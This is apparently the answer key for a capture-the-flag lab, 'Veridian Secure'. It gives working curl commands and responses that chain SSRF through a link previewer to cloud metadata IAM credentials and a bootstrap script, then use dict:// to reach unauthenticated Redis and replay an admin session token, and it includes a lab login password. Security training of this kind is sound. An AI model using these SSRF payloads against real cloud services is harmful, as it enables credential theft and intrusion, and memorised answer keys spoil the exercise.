# CTF 6: Veridian Secure -- Solutions

## Credentials

- `abcd12` / *(see credentials.json)*
- `efgh34` / *(see credentials.json)*
- `ijkl56` / *(see credentials.json)*

---

## Flag 1: SSRF to Cloud Metadata -- IAM Credential Exfiltration

### Discovery Path

**Chain A (blog post):**
1. Log in and read the dashboard. The "Infrastructure Migration Notes" post mentions cloud metadata endpoints are accessible from the internal network.
2. Navigate to `/preview` (linked in the nav bar as "Link Previewer").

**Chain B (page source):**
1. View source on any page. The login page contains:
   ```html
   <!-- service status: /health -->
   ```
2. Visit `/health`:
   ```json
   {
     "service": "Veridian Secure Portal",
     "version": "3.2.1",
     "status": "operational",
     "ssrf_note": "preview fetches are server-side, no allowlist configured",
     "internal_hint": "cloud metadata available at standard endpoint",
     "admin_route": "/admin",
     "changelog": "/static/CHANGELOG.md"
   }
   ```
3. `ssrf_note` confirms server-side fetching. `internal_hint` points to cloud metadata.

**Chain C (preview page source):**
1. View source on `/preview`:
   ```html
   <!-- fetch endpoint: /api/preview -- no validation implemented yet, see issue #47 -->
   <!-- preview accepts JSON body: {"url": "https://example.com"} -->
   ```

### Exploit

First, log in and save the session cookie to a file (used by all subsequent steps):

```bash
curl -c cookies.txt -X POST http://localhost:5180/login \
  -d "username=abcd12&password=36fea3f062c" \
  -L
```

Step 1: Fetch the metadata directory listing.

```bash
curl -X POST http://localhost:5180/api/preview \
  -H "Content-Type: application/json" \
  -b cookies.txt \
  -d '{"url": "http://169.254.169.254/latest/meta-data/"}'
```

Response:
```
iam/
iam/security-credentials/
iam/security-credentials/veridian-prod-role
```

Step 2: Fetch the IAM credentials.

```bash
curl -X POST http://localhost:5180/api/preview \
  -H "Content-Type: application/json" \
  -b cookies.txt \
  -d '{"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/veridian-prod-role"}'
```

Response:
```json
{
  "Code": "Success",
  "Type": "AWS-HMAC",
  "AccessKeyId": "VRDNFAKEKEY01",
  "SecretAccessKey": "wJalrXUtnFEMI/FAKE/KEY",
  "Token": "durham-vsec-flag1{<per-user token>}",
  "Expiration": "2099-01-01T00:00:00Z"
}
```

**Flag 1:** `durham-vsec-flag1{...}` *(per-user, see flags.json)*

---

## Flag 2: Metadata Enumeration -- Bootstrap Script Leak

### Discovery Path

1. The CHANGELOG (`/static/CHANGELOG.md`, linked from the page footer) contains:
   ```
   [INFRA] Bootstrap script embedded in user-data for automated provisioning.
   ```
2. This hints that `/latest/user-data` contains infrastructure configuration.

### Exploit

```bash
curl -X POST http://localhost:5180/api/preview \
  -H "Content-Type: application/json" \
  -b cookies.txt \
  -d '{"url": "http://169.254.169.254/latest/user-data"}'
```

Response:
```bash
#!/bin/bash
# Veridian Secure -- cloud bootstrap script
# Generated: 2024-01-15
# Environment: production-internal

# Service configuration
REDIS_HOST=redis
REDIS_PORT=6379
# internal session store -- no auth configured (legacy deployment)

APP_PORT=8080
APP_HOST=0.0.0.0

# Deployment credentials (rotate quarterly)
# DEPLOY_TOKEN=durham-vsec-flag2{<per-user token>}

echo "Bootstrapping Veridian Secure portal..."
echo "Connecting to Redis at $REDIS_HOST:$REDIS_PORT"
echo "Starting application on $APP_HOST:$APP_PORT"
```

**Flag 2:** The `DEPLOY_TOKEN` comment value: `durham-vsec-flag2{...}` *(per-user, see flags.json)*

---

## Flag 3: Redis Pivot via dict:// Scheme

### Discovery Path

1. The bootstrap script from Flag 2 reveals `REDIS_HOST=redis`, `REDIS_PORT=6379`, and confirms no authentication.
2. The CHANGELOG contains:
   ```
   [SECURITY] Reminder: preview endpoint accepts any URL scheme.
              Ticket raised to restrict to http/https only. (unresolved)
   ```
3. The "Tech Debt Register" blog post mentions `dict://` and `gopher://` scheme support.

### Exploit

Step 1: Confirm Redis is reachable.

```bash
curl -X POST http://localhost:5180/api/preview \
  -H "Content-Type: application/json" \
  -b cookies.txt \
  -d '{"url": "dict://redis:6379/INFO server"}'
```

Response: Redis server info output confirming connectivity.

Step 2: Enumerate Redis keys.

```bash
curl -X POST http://localhost:5180/api/preview \
  -H "Content-Type: application/json" \
  -b cookies.txt \
  -d '{"url": "dict://redis:6379/KEYS *"}'
```

Response includes:
```
veridian:session:admin
veridian:incident:2024-03-15
veridian:flag3
```

Step 3: Retrieve Flag 3.

```bash
curl -X POST http://localhost:5180/api/preview \
  -H "Content-Type: application/json" \
  -b cookies.txt \
  -d '{"url": "dict://redis:6379/GET veridian:flag3"}'
```

**Flag 3:** `durham-vsec-flag3{...}` *(per-user, see flags.json)*

---

## Flag 4: Session Token Replay -- Admin Panel Access

### Discovery Path

1. Redis key enumeration from Flag 3 reveals `veridian:session:admin`.
2. The "Access Control Audit" blog post states admin sessions use `X-Session-Token` header.
3. The `/health` endpoint includes `"admin_route": "/admin"`.

### Exploit

Step 1: Retrieve the admin session token from Redis.

```bash
curl -X POST http://localhost:5180/api/preview \
  -H "Content-Type: application/json" \
  -b cookies.txt \
  -d '{"url": "dict://redis:6379/GET veridian:session:admin"}'
```

Response:
```
vsec-admin-sess-a1b2c3d4e5f6
```

Step 2: Access the admin dashboard. The player must also be logged in (session cookie required for flag personalisation).

```bash
curl http://localhost:5180/admin \
  -H "X-Session-Token: vsec-admin-sess-a1b2c3d4e5f6" \
  -b cookies.txt
```

Response: The admin dashboard HTML containing the classified incident report and Flag 4.

**Flag 4:** `durham-vsec-flag4{...}` *(per-user, see flags.json)*

---

## Summary

| Flag | Technique | Difficulty | OWASP |
|------|-----------|------------|-------|
| 1 | SSRF to cloud metadata (IMDSv1) | Intermediate | A10 |
| 2 | Metadata user-data enumeration | Intermediate | A10, A05 |
| 3 | SSRF via dict:// to unauthenticated Redis | Advanced | A10, A07 |
| 4 | Session token replay from Redis to admin panel | Advanced | A10, A07, A01 |

## Key Vulnerabilities

1. **SSRF (A10):** Unvalidated server-side URL fetch in the Link Previewer allows requests to internal services
2. **Security Misconfiguration (A05):** Cloud metadata accessible without IMDSv2 token; sensitive data in user-data script
3. **Security Misconfiguration (A07):** Unauthenticated Redis on internal network; no URL scheme restrictions
4. **Broken Access Control (A01):** Admin route protected only by a static session token header with no session binding
